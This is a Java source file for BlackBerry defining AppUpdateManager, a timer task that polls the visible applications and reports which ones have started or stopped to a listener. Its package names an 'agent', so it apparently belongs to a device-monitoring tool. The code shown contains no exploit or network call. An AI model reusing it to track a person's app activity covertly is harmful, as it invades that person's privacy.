package blackberry;

import java.util.Enumeration;
import java.util.Hashtable;
import java.util.TimerTask;
import java.util.Vector;

import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;

import blackberry.agent.TaskAgent;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;

public final class AppUpdateManager extends TimerTask {
	// #debug
	private static Debug debug = new Debug("AppManager", DebugLevel.VERBOSE);
	ApplicationManager manager = ApplicationManager.getApplicationManager();
	Hashtable appSet = new Hashtable();
	AppListener appListener = AppListener.getInstance();

	boolean running;

	public void run() {
		// #debug debug
		// debug.trace("run");
		synchronized (this) {
			if (running) {
				return;
			} else {
				running = true;
			}
		}

		try {
			Hashtable newSet = new Hashtable();
			Vector startedList = new Vector();
			Vector stoppedList = new Vector();

			// Hashtable changes = new Hashtable();
			boolean haveChanges = false;

			// Check to see if application is running.
			ApplicationDescriptor descriptors[] = manager
					.getVisibleApplications();

			//#debug debug
			debug.trace("running: "+ descriptors.length);
			
			// Retrieve the name of a running application.
			for (int i = 0; i < descriptors.length; i++) {
				ApplicationDescriptor descriptor = descriptors[i];
				String name = descriptor.getName();
				newSet.put(name, descriptor);

				if (appSet.containsKey(name)) {
					// tolgo gli elementi gia' presenti.
					appSet.remove(name);
				} else {
					// #debug debug
					debug.trace("Started: " + descriptor.getName());
					startedList.addElement(descriptor.getName());
					haveChanges = true;
				}
			}

			// appList contiene gli elementi stoppati
			Enumeration stopped = appSet.keys();
			while (stopped.hasMoreElements()) {
				Object process = stopped.nextElement();
				stoppedList.addElement(process);
				// #mdebug
				String appName = (String) process;
				debug.trace("Stopped: " + appName);
				// #enddebug
			}

			appSet = newSet;

			if (!stoppedList.isEmpty()) {
				haveChanges = true;
			}

			if (haveChanges) {
				// #debug debug
				debug.trace("haveChanges");

				appListener.applicationListChange(startedList, stoppedList);
				appSet = newSet;
			}
		} finally {
			synchronized (this) {
				running = false;
			}
		}
	}

}
